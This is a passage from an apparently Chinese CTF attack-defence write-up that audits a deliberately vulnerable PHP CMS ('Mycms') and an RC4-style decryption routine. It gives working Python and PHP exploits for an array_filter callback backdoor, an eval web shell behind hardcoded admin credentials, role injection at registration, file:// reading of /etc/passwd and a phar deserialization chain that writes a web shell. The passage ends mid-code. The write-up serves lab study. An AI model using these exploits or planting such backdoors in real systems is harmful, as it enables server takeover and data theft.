class="number">255</span>);</span><br><span class="line">    $rndkey = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt;= <span class="number">255</span>; $i++) &#123;</span><br><span class="line">        $rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($j = $i = <span class="number">0</span>; $i &lt; <span class="number">256</span>; $i++) &#123;</span><br><span class="line">        $j = ($j + $box[$i] + $rndkey[$i]) % <span class="number">256</span>;</span><br><span class="line">        $tmp = $box[$i];</span><br><span class="line">        $box[$i] = $box[$j];</span><br><span class="line">        $box[$j] = $tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($a = $j = $i = <span class="number">0</span>; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">        $a = ($a + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        $j = ($j + $box[$a]) % <span class="number">256</span>;</span><br><span class="line">        $tmp = $box[$a];</span><br><span class="line">        $box[$a] = $box[$j];</span><br><span class="line">        $box[$j] = $tmp;</span><br><span class="line">        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % <span class="number">256</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((substr($result, <span class="number">0</span>, <span class="number">10</span>) == <span class="number">0</span> || substr($result, <span class="number">0</span>, <span class="number">10</span>) - time() &gt; <span class="number">0</span>) &amp;&amp;</span><br><span class="line">        substr($result, <span class="number">10</span>, <span class="number">16</span>) == substr(md5(substr($result, <span class="number">26</span>) . $keyb), <span class="number">0</span>, <span class="number">16</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> substr($result, <span class="number">26</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>依次分析，首先key已知为12333010101，那么<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$cryptkey = $keya . md5($keya . $keyc);</span><br><span class="line">$key_length = strlen($cryptkey);</span><br></pre></td></tr></table></figure></p><p>分别为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">afbedca20d58ccf2ceab39618a931d526ba4b613c047adffd92173daa701cdb6</span><br><span class="line">64</span><br></pre></td></tr></table></figure></p><p>然后操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$string =  base64_decode(substr($string, $ckey_length));</span><br><span class="line">$string_length = strlen($string);</span><br></pre></td></tr></table></figure></p><p>所以我们构造的payload的base64长度要小于64<br>然后是一堆流密钥生成步骤，到最后解密这一块<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ($a = $j = $i = <span class="number">0</span>; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">        $a = ($a + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        $j = ($j + $box[$a]) % <span class="number">256</span>;</span><br><span class="line">        $tmp = $box[$a];</span><br><span class="line">        $box[$a] = $box[$j];</span><br><span class="line">        $box[$j] = $tmp;</span><br><span class="line">        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % <span class="number">256</span>]));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>最后有一步操作，即将我们输入的密文$string，异或上之前的流密钥，得到明文$result<br>那么如果我们想要已知明文求密文，即用$result异或上流密钥即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$string .= chr(ord($result[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</span><br></pre></td></tr></table></figure></p><p>那我们怎么获取$result呢？还有一步校验要通过<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((substr($result, <span class="number">0</span>, <span class="number">10</span>) == <span class="number">0</span> || substr($result, <span class="number">0</span>, <span class="number">10</span>) - time() &gt; <span class="number">0</span>) &amp;&amp;</span><br><span class="line">        substr($result, <span class="number">10</span>, <span class="number">16</span>) == substr(md5(substr($result, <span class="number">26</span>) . $keyb), <span class="number">0</span>, <span class="number">16</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> substr($result, <span class="number">26</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>我们可以用如下方式生成$result<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$keyb = <span class="string">"9528c27d9961b981415d909a120c6e1b"</span>;</span><br><span class="line">$result = <span class="string">'ls'</span>;</span><br><span class="line">$tmp = substr(md5($result . $keyb), <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">$padding = <span class="string">'0000000000'</span>;</span><br><span class="line">$result = $padding.$tmp.$result;</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure></p><p>最后异或之前的流密钥，再base64encode，即可得到我们的input，达到任意RCE的目的。<br>值得注意的是还有一步<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$keyc = substr($string, <span class="number">0</span>, $ckey_length);</span><br></pre></td></tr></table></figure></p><p>在我们只有明文，没有加密算法的时候，他需要对密文进行截取，这就非常难办了。但是好在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ckey_length = 4;</span><br></pre></td></tr></table></figure></p><p>由于其在base64encode之后，所以我们可以对其进行爆破，数量级为64^4，还是在可爆破的范围内。<br>这样很容易即可进行RCE（这样的题目放在4个小时，2个web的AD下，可能不太好吧= =）</p><h2 id="Web2-Mycms"><a href="#Web2-Mycms" class="headerlink" title="Web2 - Mycms"></a>Web2 - Mycms</h2><p>整体源码如下，我们依次审计<br><img src="/images/2019-04-25-09-56-10.png" alt=""></p><h3 id="漏洞1-预留回调函数"><a href="#漏洞1-预留回调函数" class="headerlink" title="漏洞1 - 预留回调函数"></a>漏洞1 - 预留回调函数</h3><p>/footer.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'SCRIPT_FILENAME'</span>]==<span class="keyword">__FILE__</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;© mycms&lt;/p&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    array_filter(<span class="keyword">array</span>(base64_decode($data[<span class="string">"name"</span>])), base64_decode($data[<span class="string">"pass"</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>从代码不难看出<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_filter(<span class="keyword">array</span>(base64_decode($data[<span class="string">"name"</span>])), base64_decode($data[<span class="string">"pass"</span>]));</span><br></pre></td></tr></table></figure></p><p>该位置存在命令执行，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_filter(array(&apos;ls /tmp&apos;),&apos;system&apos;);</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-04-25-10-00-23.png" alt=""><br>但是如果直接访问footer.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/footer.php</span><br></pre></td></tr></table></figure></p><p>会直接打印<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">© mycms</span><br></pre></td></tr></table></figure></p><p>所以需要找到一个包含点，不难发现index.php有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include &quot;footer.php&quot;;?&gt;</span><br></pre></td></tr></table></figure></p><p>那么只要<code>$data[&quot;name&quot;]</code>和<code>$data[&quot;pass&quot;]</code>可控，即可进行任意命令执行<br>我们跟进两个变量<br>/libs/inc_common.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = array_merge($_POST,$_GET);</span><br></pre></td></tr></table></figure></p><p>可以发现，既可以用$_POST也可以用$_GET进行传参<br>所以第一个漏洞利用exp可以写为如下<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">'http://localhost/index.php'</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">"name"</span>:base64.b64encode(<span class="string">'ls'</span>),</span><br><span class="line"><span class="string">"pass"</span>:base64.b64encode(<span class="string">'system'</span>)</span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(data=data,url=url)</span><br></pre></td></tr></table></figure></p><h2 id="漏洞2-预留登录shell"><a href="#漏洞2-预留登录shell" class="headerlink" title="漏洞2 - 预留登录shell"></a>漏洞2 - 预留登录shell</h2><p>/shell.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">'role'</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们发现有一个较为明显的预留shell，但是需要<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">'role'</span>] == <span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>我们跟进该值：<br>/login.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (User::check($user, $pass)) &#123;</span><br><span class="line">        setcookie(<span class="string">"auth"</span>,$user.<span class="string">"\t"</span>.User::encodePassword($pass));</span><br><span class="line">        $_SESSION[<span class="string">'user'</span>] = User::getIDByName($user);</span><br><span class="line">        $_SESSION[<span class="string">'role'</span>] = User::getRoleByName($user);</span><br><span class="line">        $wrong            = <span class="keyword">false</span>;</span><br><span class="line">        header(<span class="string">"Location: index.php"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $wrong = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以发现如上登录函数，其中有赋值操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">'role'</span>] = User::getRoleByName($user);</span><br></pre></td></tr></table></figure></p><p>跟进该函数getRoleByName()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getRoleByName</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $users = User::getAllUser();</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($users); $i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($users[$i][<span class="string">'name'</span>] === $name) &#123;</span><br><span class="line">                <span class="keyword">return</span> $users[$i][<span class="string">'role'</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>再跟进getAllUser()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getAllUser</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $sql = <span class="string">'select * from `user`'</span>;</span><br><span class="line">       $db  = <span class="keyword">new</span> MyDB();</span><br><span class="line">       <span class="keyword">if</span> (!$users = $db-&gt;exec_sql($sql)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">'id'</span> =&gt; <span class="number">1</span>, <span class="string">'name'</span> =&gt; <span class="string">'admin'</span>, <span class="string">'password'</span> =&gt; <span class="keyword">self</span>::encodePassword(<span class="string">'admin123'</span>), <span class="string">'role'</span> =&gt; <span class="number">1</span>));</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> $users;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>可以发现有admin账户信息，容易知道admin账户为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username = admin</span><br><span class="line">password = admin123</span><br></pre></td></tr></table></figure></p><p>那么综合来看，只需使用该账户登录，即可使用shell.php<br>那么可以写出如下exp：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">"http://localhost/login.php"</span></span><br><span class="line">s = requests.session()</span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'user'</span>:<span class="string">'admin'</span>,</span><br><span class="line"><span class="string">'pass'</span>:<span class="string">'admin123'</span></span><br><span class="line">&#125;</span><br><span class="line">r = s.post(url, data=data)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'1'</span>:<span class="string">"system('ls');"</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">"http://localhost/shell.php"</span></span><br><span class="line">r = s.post(url,data=data)</span><br></pre></td></tr></table></figure></p><h3 id="漏洞3-管理员覆盖"><a href="#漏洞3-管理员覆盖" class="headerlink" title="漏洞3 - 管理员覆盖"></a>漏洞3 - 管理员覆盖</h3><p>我们注意到注册页面<br>/register.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$data[<span class="string">"name"</span>] = addslashes($data[<span class="string">'name'</span>]);</span><br><span class="line">$data[<span class="string">"password"</span>] = User::encodePassword($data[<span class="string">'password'</span>]);</span><br><span class="line">$res = User::insertuser($data);</span><br></pre></td></tr></table></figure></p><p>我们跟进insertuser()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">insertuser</span><span class="params">($data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> MyDB();</span><br><span class="line">        $sql = <span class="string">"insert into user("</span>.implode(<span class="string">","</span>,array_keys($data)).<span class="string">") values ('"</span>.implode(<span class="string">"','"</span>,array_values($data)).<span class="string">"')"</span>;</span><br><span class="line">        <span class="keyword">if</span> (!$result = $db-&gt;exec_sql($sql)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; <span class="string">'数据库异常'</span>, <span class="string">'code'</span> =&gt; <span class="number">-1</span>, <span class="string">'data'</span> =&gt; <span class="keyword">array</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; <span class="string">'操作成功'</span>, <span class="string">'code'</span> =&gt; <span class="number">0</span>, <span class="string">'data'</span> =&gt; <span class="keyword">array</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现关键语句<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"insert into user("</span>.implode(<span class="string">","</span>,array_keys($data)).<span class="string">") values ('"</span>.implode(<span class="string">"','"</span>,array_values($data)).<span class="string">"')"</span>;</span><br></pre></td></tr></table></figure></p><p>未对$data进行判断，不但未进行查重，也没对数组内容进行check，我们可以顺便传入role，覆盖管理员<br>可写出如下脚本<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://localhost/register.php"</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'name'</span>:<span class="string">'skysky'</span></span><br><span class="line"><span class="string">'password'</span>:<span class="string">'skysky'</span></span><br><span class="line"><span class="string">'role'</span>:<span class="string">'1'</span></span><br><span class="line">&#125;</span><br><span class="line">r = s.post(url, data=data)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://localhost/login.php"</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'user'</span>:<span class="string">'skysky'</span>,</span><br><span class="line"><span class="string">'pass'</span>:<span class="string">'skysky'</span></span><br><span class="line">&#125;</span><br><span class="line">r = s.post(url, data=data)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'1'</span>:<span class="string">"system('ls');"</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">"http://localhost/shell.php"</span></span><br><span class="line">r = s.post(url,data=data)</span><br></pre></td></tr></table></figure></p><h3 id="漏洞点4-任意文件读取"><a href="#漏洞点4-任意文件读取" class="headerlink" title="漏洞点4 - 任意文件读取"></a>漏洞点4 - 任意文件读取</h3><p>我们看到文件<br>/down.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($data[<span class="string">'filename'</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/^http/"</span>, $data[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    chdir(<span class="string">"/var/www/html/static/img/"</span>);    </span><br><span class="line">    <span class="keyword">if</span> (file_exists($data[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">        header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">        header(<span class="string">'content-disposition:attachment; filename='</span>.basename($data[<span class="string">'filename'</span>]));</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($data[<span class="string">'filename'</span>]);<span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件不存在"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>这里对filename参数做了过滤，但过滤非常有限，我们可以用file协议进行任意文件读取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/?filename=file:///etc/passwd</span><br></pre></td></tr></table></figure></p><h3 id="漏洞点5-反序列化"><a href="#漏洞点5-反序列化" class="headerlink" title="漏洞点5 - 反序列化"></a>漏洞点5 - 反序列化</h3><p>我们看到文件<br>/libs/class_debug.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Debug</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $msg=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $log=<span class="string">''</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($msg = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = $msg;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;log = <span class="string">'errorlog'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;fm = <span class="keyword">new</span> FileManager(<span class="keyword">$this</span>-&gt;msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $str = <span class="string">"[DEUBG]"</span> . $msg;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;fm-&gt;save();</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        file_put_contents(<span class="string">'/var/www/html/logs/'</span>.<span class="keyword">$this</span>-&gt;log,<span class="keyword">$this</span>-&gt;msg);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以发现这里有比较明显任意写文件漏洞，但我们需要控制文件名和文件内容，即<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;log</span><br><span class="line">$this-&gt;msg</span><br></pre></td></tr></table></figure></p><p>这里的exp构造较为容易<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Debug</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $msg=<span class="string">'sky.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $log=<span class="string">'&lt;?php @eval($_POST[\'sky\'])'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Debug();</span><br><span class="line">var_dump(serialize($a));</span><br></pre></td></tr></table></figure></p><p>可以得到我们的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Debug&quot;:2:&#123;s:3:&quot;msg&quot;;s:7:&quot;sky.php&quot;;s:3:&quot;log&quot;;s:26:&quot;&lt;?php @eval($_POST[&apos;sky&apos;])&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>但是我们缺少一个触发序列化的点,这里容易想到phar反序列化。<br>我们全局搜索file_exists()，可以发现/down.php中存在该操作<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_exists($data[<span class="string">'filename'</span>]))</span><br></pre></td></tr></table></figure></p><p>同时该处没有对伪协议进行过滤，我们可以使用操作：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=phar:<span class="comment">//......</span></span><br></pre></td></tr></table></figure></p><p>于是我们进一步寻找上传点，我们在/admin.php发现对应上传功能<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($data[<span class="string">'action'</span>] == <span class="string">'send_article'</span>) &#123;</span><br><span class="line">    $res = Article::sendArticle($data);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;html&gt;&lt;script&gt;alert('"</span> . $res[<span class="string">'msg'</span>] . <span class="string">"')&lt;/script&gt;&lt;/html&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='admin.php'&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们跟进sendArticle()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$oldname  = $_FILES[<span class="string">'files'</span>][<span class="string">'name'</span>];</span><br><span class="line">$tmp      = $_FILES[<span class="string">'files'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">$pathinfo = pathinfo($oldname);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_array($pathinfo[<span class="string">'extension'</span>], <span class="keyword">array</span>(<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; <span class="string">'文件上传类型出错'</span>, <span class="string">'code'</span> =&gt; <span class="number">-1</span>, <span class="string">'data'</span> =&gt; <span class="keyword">array</span>());</span><br><span class="line">&#125;</span><br><span class="line">$nameid = time() . rand(<span class="number">1000</span>, <span class="number">9999</span>);</span><br><span class="line">$name =  $nameid. <span class="string">'.'</span> . $pathinfo[<span class="string">'extension'</span>];</span><br><span class="line">$filepath = dirname(dirname(<span class="keyword">__FILE__</span>)) . <span class="string">'/uploads/'</span>;</span><br><span class="line">$file = <span class="string">'uploads/'</span> . $name;</span><br><span class="line"><span class="keyword">if</span> (!move_uploaded_file($tmp, $filepath . $name)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'msg'</span> =&gt; <span class="string">'文件上传出错'</span>, <span class="string">'code'</span> =&gt; <span class="number">-1</span>, <span class="string">'data'</span> =&gt; <span class="keyword">array</span>());</span><br><span 